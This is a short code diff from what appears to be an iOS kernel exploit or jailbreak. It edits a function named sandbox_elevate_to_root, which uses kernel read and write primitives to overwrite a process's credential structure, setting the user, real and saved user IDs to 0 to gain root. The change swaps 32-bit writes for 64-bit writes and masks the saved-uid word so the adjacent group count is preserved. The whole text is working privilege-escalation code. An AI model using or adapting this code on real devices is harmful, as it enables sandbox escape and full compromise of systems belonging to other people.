@@ -272,15 +272,21 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     // Write uid=0 into posix_cred
     // ucred + 0x18 = posix_cred
     // posix_cred + 0x00 = cr_uid, +0x04 = cr_ruid, +0x08 = cr_svuid
+    // cr_uid and cr_ruid share one 64-bit word; cr_svuid is in the next word
     uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
-    uint32_t old_uid = early_kread32(posix + OFF_POSIX_CR_UID);
+
+    uint32_t old_uid = (uint32_t)(early_kread64(posix + OFF_POSIX_CR_UID) & 0xFFFFFFFF);
     NSLog(@"[SBX] elevate: current uid in posix_cred = %u", old_uid);
 
-    early_kwrite32(posix + OFF_POSIX_CR_UID, 0);
-    early_kwrite32(posix + OFF_POSIX_CR_RUID, 0);
-    early_kwrite32(posix + OFF_POSIX_CR_SVUID, 0);
+    // Zero cr_uid (bytes 0-3) and cr_ruid (bytes 4-7) in one 64-bit write
+    early_kwrite64(posix + OFF_POSIX_CR_UID, 0);
 
-    uint32_t new_uid = early_kread32(posix + OFF_POSIX_CR_UID);
+    // Zero cr_svuid (bytes 8-11), preserve cr_ngroups (bytes 12-15)
+    uint64_t svuid_word = early_kread64(posix + OFF_POSIX_CR_SVUID);
+    svuid_word &= 0xFFFFFFFF00000000ULL;
+    early_kwrite64(posix + OFF_POSIX_CR_SVUID, svuid_word);
+
+    uint32_t new_uid = (uint32_t)(early_kread64(posix + OFF_POSIX_CR_UID) & 0xFFFFFFFF);
     if (new_uid == 0 && getuid() == 0) {
         NSLog(@"[SBX] elevate success! uid=0");
         return 0;
